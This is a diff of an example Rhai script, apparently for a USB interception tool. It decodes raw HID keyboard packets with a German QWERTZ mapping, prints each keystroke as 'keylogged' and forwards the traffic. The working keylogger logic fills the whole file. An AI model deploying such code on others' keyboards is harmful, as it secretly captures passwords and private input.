@@ -1,35 +1,56 @@
+// keylogger.rhai
+// this script logs keystrokes by interpreting raw hid packets.
+// it maps hid usage ids to characters using a german (qwertz) layout.
+// a lot if keys are missing here this is just a example.
+//
+// this was only tested on the "Logitech MX Keys S (GERMAN)" and your model might require tweaking the script
+
 fn process(direction, data) {
-    // Wir interessieren uns nur für Daten, die ZUM PC gehen (IN)
-    // und die lang genug sind (Standard HID Keyboard Report ist 8 Bytes)
+    // only process input data (direction "IN")
+    // check if the packet is long enough (standard keyboard report is usually 8 bytes)
     if direction == "IN" && data.len() >= 8 {
 
-        let key_code = data[2]; // Byte 2 ist der erste gedrückte Key
+        let key_code = data[2]; // byte 2 contains the first pressed key
 
-        // 0 = Keine Taste gedrückt (Key Release) -> ignorieren
+        // 0 = no key pressed (key release) -> ignore
         if key_code != 0 {
-            let char = "";
+            let key_char = "";
 
-            // Mapping HID Usage ID -> Zeichen (Auszug)
+            // mapping hid usage id -> character
+            // codes 4-29 are the alphabet
             if key_code >= 4 && key_code <= 29 {
-                // a-z (4 ist a, 5 ist b, etc.)
-                // Rhai hat keine direkte ASCII conversion, wir improvisieren
-                let alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"];
-                char = alphabet[key_code - 4];
-            } else if key_code >= 30 && key_code <= 38 {
-                // 1-9
+                // rhai does not have direct ascii conversion, so we use an array.
+                // this array is modified for the german qwertz layout:
+                // the last two entries (positions 24 and 25) are swapped ("z" comes before "y").
+                let alphabet = [
+                    "a","b","c","d","e","f","g","h","i","j","k","l","m",
+                    "n","o","p","q","r","s","t","u","v","w","x","z","y"
+                ];
+                key_char = alphabet[key_code - 4];
+            }
+            // codes 30-38 are 1-9
+            else if key_code >= 30 && key_code <= 38 {
                 let nums = ["1","2","3","4","5","6","7","8","9"];
-                char = nums[key_code - 30];
-            } else if key_code == 39 { char = "0"; }
-            else if key_code == 40 { char = "[ENTER]"; }
-            else if key_code == 44 { char = "[SPACE]"; }
-            else if key_code == 41 { char = "[ESC]"; }
-            else if key_code == 42 { char = "[BACKSPACE]"; }
+                key_char = nums[key_code - 30];
+            }
+            // code 39 is 0
+            else if key_code == 39 {
+                key_char = "0";
+            }
+            // special keys
+            else if key_code == 40 { key_char = "[enter]"; }
+            else if key_code == 44 { key_char = "[space]"; }
+            else if key_code == 41 { key_char = "[esc]"; }
+            else if key_code == 42 { key_char = "[backspace]"; }
             else {
-                char = `[HEX:${key_code}]`;
+                // unknown key -> print hex code so you can look it up
+                key_char = `[hex:${key_code}]`;
             }
 
-            print(`Keylogged: ${char}`);
+            print(`keylogged: ${key_char}`);
         }
     }
-    send_to(direction, 0data);
+
+    // forward the data
+    send_to(direction, data);
 }
